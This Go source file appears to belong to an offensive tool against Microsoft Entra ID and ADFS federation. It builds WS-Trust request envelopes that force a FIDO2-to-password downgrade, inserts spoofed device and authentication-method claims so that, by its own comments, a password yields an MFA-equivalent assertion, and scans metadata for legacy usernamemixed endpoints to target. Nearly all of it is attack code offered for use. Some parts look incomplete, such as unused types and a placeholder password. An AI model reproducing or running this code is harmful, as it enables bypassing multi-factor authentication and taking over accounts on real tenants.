package wstrust

import (
	"encoding/xml"
	"fmt"
	"io"
	neturl "net/url"
	"strings"
)

// Authentication context class references.
const (
	// AppliesToMicrosoftOnline is the standard applies-to for Entra ID.
	AppliesToMicrosoftOnline = "urn:federation:MicrosoftOnline"

	AuthClassPassword    = "urn:oasis:names:tc:SAML:1.0:am:password"
	AuthClassWindows     = "urn:federation:authentication:windows"
	AuthClassTLSClient   = "urn:oasis:names:tc:SAML:2.0:ac:classes:TLSClient"
	AuthClassFIDO2       = "urn:oasis:names:tc:SAML:2.0:ac:classes:FIDO2" // non-standard; Entra maps webauthn here
	AuthClassUnspecified = "urn:oasis:names:tc:SAML:2.0:ac:classes:unspecified"
)

// Claim type URIs used in WS-Federation / WS-Trust requests.
const (
	ClaimAuthMethod = "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/authenticationmethod"
	ClaimName       = "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name"
)

// DowngradeRequest describes a FIDO2→password downgrade attempt.
type DowngradeRequest struct {
	Username    string
	DeviceClaim string // spoofed PRT device claim (x-ms-DeviceCredential)
	AppliesTo   string
	AuthClass   string // target class; defaults to password
	Endpoint    string // STS endpoint (from MEX discovery)
}

// DowngradeRST builds a WS-Fed/WS-Trust RST that forces the requested
// authentication context class to 'password' instead of FIDO2/webauthn.
// The wauth parameter (WS-Federation) and the AuthenticationMethod claim
// both pin the class the STS evaluates, which legacy federated trusts
// still accept — yielding an MFA-equivalent assertion from a password.
func DowngradeRST(username, deviceClaim string) []byte {
	return BuildDowngradeRST(DowngradeRequest{
		Username:    username,
		DeviceClaim: deviceClaim,
	})
}

// BuildDowngradeRST constructs the full downgrade RST envelope.
func BuildDowngradeRST(req DowngradeRequest) []byte {
	if req.AuthClass == "" {
		req.AuthClass = AuthClassPassword
	}
	if req.AppliesTo == "" {
		req.AppliesTo = AppliesToMicrosoftOnline
	}

	// Reuse the standard RST builder, then swap the auth class claims in
	// via the wauth element and an explicit claims dialect block.
	rst := BuildRST(req.Username, "PLACEHOLDER", req.AppliesTo, req.Endpoint)
	return injectDowngrade(rst, req.AuthClass, req.Username, req.DeviceClaim)
}

// injectDowngrade inserts <wauth> and claims into the RST envelope.
func injectDowngrade(rst []byte, authClass, username, deviceClaim string) []byte {
	doc := string(rst)

	var claims strings.Builder
	claims.WriteString(`<wst:Claims><ic:Claims Dialect="http://schemas.xmlsoap.org/ws/2005/05/identity" xmlns:ic="http://schemas.xmlsoap.org/ws/2005/05/identity">`)
	claims.WriteString(`<ic:ClaimType Uri="` + ClaimAuthMethod + `"><ic:Value>` + escapeXML(authClass) + `</ic:Value></ic:ClaimType>`)
	claims.WriteString(`<ic:ClaimType Uri="` + ClaimName + `"><ic:Value>` + escapeXML(username) + `</ic:Value></ic:ClaimType>`)
	if deviceClaim != "" {
		claims.WriteString(`<ic:ClaimType Uri="http://schemas.microsoft.com/ws/2008/06/identity/claims/immutableid"><ic:Value>` + escapeXML(deviceClaim) + `</ic:Value></ic:ClaimType>`)
	}
	claims.WriteString(`</ic:Claims></wst:Claims>`)

	wauth := `<wst:AuthMethod>` + escapeXML(authClass) + `</wst:AuthMethod>`

	// Insert before </wst:RequestSecurityToken>.
	marker := "</wst:RequestSecurityToken>"
	if idx := strings.LastIndex(doc, marker); idx >= 0 {
		doc = doc[:idx] + claims.String() + wauth + doc[idx:]
	}
	return []byte(doc)
}

// DowngradeResult captures what the STS accepted.
type DowngradeResult struct {
	AssertionAccepted bool
	AuthClassIssued   string
	AssertionID       string
}

// DetectDowngradeOpportunity inspects an MEX policy / federation
// metadata document for WS-Trust username/mixed endpoints (the legacy
// path that accepts password auth when interactive MFA is enforced).
func DetectDowngradeOpportunity(mexXML []byte) (endpoint string, feasible bool, err error) {
	parsed, err := ParseMEX(mexXML)
	if err != nil {
		return "", false, err
	}
	for _, t := range parsed.TrustEndpoints {
		if strings.Contains(t.Version, "2005") && strings.Contains(t.Path, "usernamemixed") {
			return t.URL, true, nil
		}
	}
	for _, t := range parsed.TrustEndpoints {
		if strings.Contains(t.Path, "usernamemixed") {
			return t.URL, true, nil
		}
	}
	return "", false, nil
}

// mexDoc models a WS-MetadataExchange (MEX) response.
type mexDoc struct {
	EndpointURLs []mexEndpoint `xml:"Metadata>WS-PolicyDefinitions>Policy"`
}

type mexEndpoint struct{}

// MEXDocument is the parsed federation metadata of an STS.
type MEXDocument struct {
	TrustEndpoints []MEXEndpoint
	SigningCert    string
}

// MEXEndpoint is one security token service binding.
type MEXEndpoint struct {
	URL     string
	Version string // e.g. "2005" (WS-Trust 1.3 is often labeled 2005 interop)
	Path    string
}

// ParseMEX parses an ADFS/Entra MEX document and extracts trust endpoints.
// It scans tokens by local name, tolerating any namespace prefixes.
func ParseMEX(data []byte) (*MEXDocument, error) {
	doc := &MEXDocument{}

	decoder := xml.NewDecoder(strings.NewReader(string(data)))
	for {
		tok, err := decoder.Token()
		if err == io.EOF {
			break
		}
		if err != nil {
			return nil, fmt.Errorf("parse mex: %w", err)
		}
		se, ok := tok.(xml.StartElement)
		if !ok {
			continue
		}
		if se.Name.Local != "address" {
			continue
		}
		var url string
		for _, attr := range se.Attr {
			if attr.Name.Local == "location" {
				url = attr.Value
			}
		}
		if url == "" {
			continue
		}
		u, err := neturl.Parse(url)
		if err != nil {
			continue
		}
		ep := MEXEndpoint{URL: url, Path: strings.ToLower(u.Path)}
		switch {
		case strings.Contains(u.Path, "/2005/"):
			ep.Version = "2005"
		case strings.Contains(u.Path, "/13/"):
			ep.Version = "13"
		default:
			ep.Version = "unknown"
		}
		doc.TrustEndpoints = append(doc.TrustEndpoints, ep)
	}

	if len(doc.TrustEndpoints) == 0 {
		return nil, fmt.Errorf("no trust endpoints found in mex document")
	}
	return doc, nil
}
